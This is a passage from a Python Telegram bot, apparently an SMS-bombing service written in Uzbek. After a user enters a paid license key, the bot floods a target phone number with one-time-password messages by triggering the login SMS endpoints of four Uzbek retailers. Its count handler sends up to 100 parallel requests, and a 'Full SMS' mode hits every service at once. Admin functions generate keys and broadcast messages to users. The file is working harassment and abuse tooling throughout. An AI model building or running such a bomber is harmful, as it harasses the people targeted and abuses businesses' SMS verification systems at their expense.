        text += f"BeeMarket: {week_stats[3]}\n"
        text += f"AlChiroq: {week_stats[4]}\n"
    else:
        text += "Ma'lumot yo'q\n"
    
    keyboard = [[InlineKeyboardButton("🔙 Orqaga", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

# -------------------- HANDLER FUNKSIYALARI --------------------

async def handle_enter_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kalit kiritish - YANGI: bir marta aktivlashtiriladi"""
    key = update.message.text.strip().upper()
    
    # Format tekshirish
    if not key.startswith("KXB-UZ-"):
        await update.message.reply_text(
            "❌ Xato: KXB-UZ- bilan boshlanishi kerak!\n\n"
            "Misol: KXB-UZ-ABC12345"
        )
        return ENTER_KEY
    
    key_part = key.replace("KXB-UZ-", "")
    
    if len(key_part) != 8:
        await update.message.reply_text(
            f"❌ Xato: {len(key_part)} ta belgi kiritildi, 8 ta bo'lishi kerak!\n\n"
            f"Siz: {key}\n"
            f"To'g'ri: KXB-UZ-ABC12345"
        )
        return ENTER_KEY
    
    if not all(c in string.ascii_uppercase + string.digits for c in key_part):
        await update.message.reply_text(
            "❌ Xato: Faqat HARFLAR va RAQAMLAR bo'lishi kerak!\n\n"
            "Misol: KXB-UZ-ABC12345"
        )
        return ENTER_KEY
    
    # Kalitni aktivlashtirish (bir marta)
    success, message = activate_key(key, update.effective_user.id)
    
    if success:
        await update.message.reply_text(f"✅ {message}")
        
        # Statusni yangilash
        user = update.effective_user
        has_valid_key = user_has_valid_key(user.id)
        
        if has_valid_key:
            _, active_key = check_user_key_valid(user.id)
            await update.message.reply_text(
                f"✅ Endi SMS yuborishingiz mumkin!\n"
                f"🔑 Kalit: {active_key}\n"
                f"♾️ Cheksiz foydalanishingiz mumkin!"
            )
        
        await show_main_menu_after_action(update, user)
    else:
        await update.message.reply_text(f"❌ {message}")
        # Qayta urinish
        return ENTER_KEY
    
    return ConversationHandler.END

async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Telefon raqam"""
    phone = update.message.text.strip().replace('+', '').replace(' ', '').replace('-', '')
    
    if not (len(phone) == 12 and phone.isdigit() and phone.startswith('998')):
        await update.message.reply_text(
            "❌ Xato raqam!\n\n"
            "Format: 998901234567"
        )
        return PHONE_NUMBER
    
    context.user_data['phone'] = phone
    
    if context.user_data.get('service') == 'alchiroq':
        await update.message.reply_text(
            "🔢 Necha marta? (1-100):"
        )
        return ALCHIROQ_COUNT
    
    # Bir martalik SMS
    service = context.user_data.get('service')
    status_msg = await update.message.reply_text(f"🔄 Yuborilmoqda...")
    
    if service == 'olcha':
        service_obj = OlchaSMSService()
        result = service_obj.trigger_otp(phone)
    elif service == 'brandstore':
        service_obj = BrandStoreService()
        result = service_obj.trigger_otp(phone)
    elif service == 'beemarket':
        service_obj = BeeMarketService()
        result = service_obj.trigger_otp(phone)
    else:
        result = "❌"
    
    # Natijani chiroyli ko'rsatish
    if result == "✅":
        final = f"✅ {service} muvaffaqiyatli!"
        update_stats(service, 1)
    elif result == "🚫":
        final = f"🚫 {service}: limit!"
    else:
        final = f"❌ {service}: xatolik!"
    
    await status_msg.edit_text(final)
    
    user = update.effective_user
    await show_main_menu_after_action(update, user)
    
    return ConversationHandler.END

async def handle_alchiroq_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """AlChiroq soni"""
    try:
        count = int(update.message.text.strip())
        if count < 1 or count > 100:
            await update.message.reply_text("❌ 1-100 oralig'ida!")
            return ALCHIROQ_COUNT
    except ValueError:
        await update.message.reply_text("❌ Son kiriting!")
        return ALCHIROQ_COUNT
    
    phone = context.user_data.get('phone')
    service = AlChiroqService()
    
    status_msg = await update.message.reply_text(f"🔄 {count} ta yuborilmoqda...")
    
    # Parallel yuborish
    loop = asyncio.get_event_loop()
    futures = []
    
    for _ in range(count):
        future = loop.run_in_executor(executor, service.trigger_otp, phone)
        futures.append(future)
    
    results = []
    success_count = 0
    
    for i, future in enumerate(futures):
        try:
            result = await asyncio.wrap_future(future)
            results.append(result)
            if result == "✅":
                success_count += 1
        except:
            results.append("❌")
    
    # Statistikani yangilash
    update_stats('alchiroq', success_count)
    
    # Natijalarni hisoblash
    success = results.count("✅")
    limit = results.count("🚫")
    error = results.count("❌")
    
    final = (
        f"📊 ALCHIROQ NATIJALARI\n\n"
        f"✅ Muvaffaqiyat: {success}\n"
        f"🚫 Limit: {limit}\n"
        f"❌ Xatolik: {error}\n"
        f"📊 Jami: {count}"
    )
    
    await status_msg.edit_text(final)
    
    user = update.effective_user
    await show_main_menu_after_action(update, user)
    
    return ConversationHandler.END

async def handle_full_sms_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Full SMS"""
    phone = update.message.text.strip().replace('+', '').replace(' ', '').replace('-', '')
    
    if not (len(phone) == 12 and phone.isdigit() and phone.startswith('998')):
        await update.message.reply_text(
            "❌ Xato raqam!\n\nFormat: 998901234567"
        )
        return FULL_SMS_PHONE
    
    status_msg = await update.message.reply_text("🔄 Full SMS boshlandi...")
    
    services = [
        ("Olcha", OlchaSMSService()),
        ("BrandStore", BrandStoreService()),
        ("BeeMarket", BeeMarketService()),
        ("AlChiroq", AlChiroqService())
    ]
    
    # Parallel yuborish
    loop = asyncio.get_event_loop()
    futures = []
    
    for name, service_obj in services:
        future = loop.run_in_executor(executor, service_obj.trigger_otp, phone)
        futures.append((name, future))
    
    results = []
    for name, future in futures:
        try:
            result = await asyncio.wrap_future(future)
            results.append(f"{name}: {result}")
            
            # Statistikani yangilash
            if result == "✅":
                service_name = name.lower()
                if service_name == "olcha":
                    update_stats('olcha', 1)
                elif service_name == "brandstore":
                    update_stats('brandstore', 1)
                elif service_name == "beemarket":
                    update_stats('beemarket', 1)
                elif service_name == "alchiroq":
                    update_stats('alchiroq', 1)
        except:
            results.append(f"{name}: ❌")
    
    final = "📊 FULL SMS:\n\n" + "\n".join(results)
    await status_msg.edit_text(final)
    
    user = update.effective_user
    await show_main_menu_after_action(update, user)
    
    return ConversationHandler.END

async def handle_key_generate_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kalit soni"""
    try:
        count = int(update.message.text.strip())
        if count < 1 or count > 100:
            await update.message.reply_text("❌ 1-100 oralig'ida!")
            return KEY_GENERATE_COUNT
    except ValueError:
        await update.message.reply_text("❌ Son kiriting!")
        return KEY_GENERATE_COUNT
    
    context.user_data['key_count'] = count
    await update.message.reply_text("📅 Necha kun? (1-365):")
    return KEY_GENERATE_DAYS

async def handle_key_generate_days(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kalit kunlari"""
    try:
        days = int(update.message.text.strip())
        if days < 1 or days > 365:
            await update.message.reply_text("❌ 1-365 oralig'ida!")
            return KEY_GENERATE_DAYS
    except ValueError:
        await update.message.reply_text("❌ Son kiriting!")
        return KEY_GENERATE_DAYS
    
    count = context.user_data.get('key_count', 1)
    keys = generate_key(update.effective_user.id, count, days)
    
    text = f"✅ {count} ta kalit yaratildi:\n\n"
    for i, key in enumerate(keys, 1):
        text += f"{i}. {key}\n"
    
    # Muddati
    expires = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    text += f"\n📅 Amal qilish muddati: {days} kun\n📅 Tugash vaqti: {expires}"
    text += f"\n\n⚠️ Kalit bir marta aktivlashtiriladi va cheksiz ishlaydi!"
    
    await update.message.reply_text(text)
    
    keyboard = [[InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Admin panel:", reply_markup=reply_markup)
    
    return ConversationHandler.END

async def handle_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast"""
    message = update.message.text
    users = get_all_users()
    
    status = await update.message.reply_text(f"📢 {len(users)} foydalanuvchiga yuborilmoqda...")
    
    success = 0
    failed = 0
    
    for user in users:
        try:
            await context.bot.send_message(
                chat_id=user[0],
                text=f"📢 ADMIN XABARI:\n\n{message}"
            )
            success += 1
            await asyncio.sleep(0.03)  # Rate limit
        except:
            failed += 1
    
    await status.edit_text(f"✅ Yuborildi: {success}\n❌ Xatolik: {failed}")
    
    keyboard = [[InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Admin panel:", reply_markup=reply_markup)
    
    return ConversationHandler.END

async def show_main_menu_after_action(update, user):
    """Amaldan keyin menyu"""
    # Statusni yangilash
    update_user_key_status(user.id)
    has_valid_key = user_has_valid_key(user.id)
    
    if user.id == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("📱 SMS Yuborish", callback_data="sms_menu")],
            [InlineKeyboardButton("📊 Full SMS", callback_data="full_sms")],
            [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = "✅ Amaliyot bajarildi, Admin!"
    elif has_valid_key:
        _, active_key = check_user_key_valid(user.id)
        keyboard = [
            [InlineKeyboardButton("📱 SMS Yuborish", callback_data="sms_menu")],
            [InlineKeyboardButton("📊 Full SMS", callback_data="full_sms")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = f"✅ Amaliyot bajarildi!\n🔑 Faol kalit: {active_key}\n♾️ Cheksiz foydalanish"
    else:
        keyboard = [
            [InlineKeyboardButton("🔑 Kalit kiritish", callback_data="enter_key")],
            [InlineKeyboardButton("ℹ️ Yordam", callback_data="help")]
        ]
        text = "✅ Amaliyot bajarildi!\n⚠️ Kalit yo'q yoki bloklangan!"
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bekor qilish"""
    await update.message.reply_text("❌ Bekor qilindi")
    user = update.effective_user
    await show_main_menu_after_action(update, user)
    return ConversationHandler.END

# -------------------- MAIN --------------------

def main():
    """Botni ishga tushirish"""
    # Databaseni yaratish
    init_database()
    
    # Application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Handlerlar
    enter_key = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^enter_key$")],
        states={ENTER_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_enter_key)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False,    # <--- SHU YERDA VERGUL BO'LISHI SHART
        per_chat=True,        # <--- SHU YERDA HAM VERGUL BO'LISHI SHART
        per_user=True         # <--- Oxirgi parametr, vergul shart emas
    )
    
    sms = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^(alchiroq|olcha|brandstore|beemarket)$")],
        states={
            PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number)],
            ALCHIROQ_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_alchiroq_count)]
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False,    # <--- SHU YERDA VERGUL BO'LISHI SHART
        per_chat=True,        # <--- SHU YERDA HAM VERGUL BO'LISHI SHART
        per_user=True         # <--- Oxirgi parametr, vergul shart emas
    )
    
    full_sms = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^full_sms$")],
        states={FULL_SMS_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_full_sms_phone)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False,    # <--- SHU YERDA VERGUL BO'LISHI SHART
        per_chat=True,        # <--- SHU YERDA HAM VERGUL BO'LISHI SHART
        per_user=True         # <--- Oxirgi parametr, vergul shart emas
    )
    
    key_gen = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_generate_key$")],
        states={
            KEY_GENERATE_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key_generate_count)],
            KEY_GENERATE_DAYS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key_generate_days)]
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False,    # <--- SHU YERDA VERGUL BO'LISHI SHART
        per_chat=True,        # <--- SHU YERDA HAM VERGUL BO'LISHI SHART
        per_user=True         # <--- Oxirgi parametr, vergul shart emas
    )
    
    broadcast = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_broadcast$")],
        states={BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_broadcast_message)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False,    # <--- SHU YERDA VERGUL BO'LISHI SHART
        per_chat=True,        # <--- SHU YERDA HAM VERGUL BO'LISHI SHART
        per_user=True         # <--- Oxirgi parametr, vergul shart emas
    )
    
    # Qo'shish
    app.add_handler(CommandHandler("start", start))
    app.add_handler(enter_key)
    app.add_handler(sms)
    app.add_handler(full_sms)
    app.add_handler(key_gen)
    app.add_handler(broadcast)
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("=" * 60)
    print("🤖 SMS BOT ISHGA TUSHDI!")
    print("=" * 60)
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🔑 Kalit formati: KXB-UZ-XXXXXXXX")
    print(f"📊 Yangi tizim: Kalit bir marta aktivlashadi va cheksiz ishlaydi!")
    print(f"🔴 Admin panelda faolsizlantirish tugmasi mavjud")
    print(f"📅 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    main()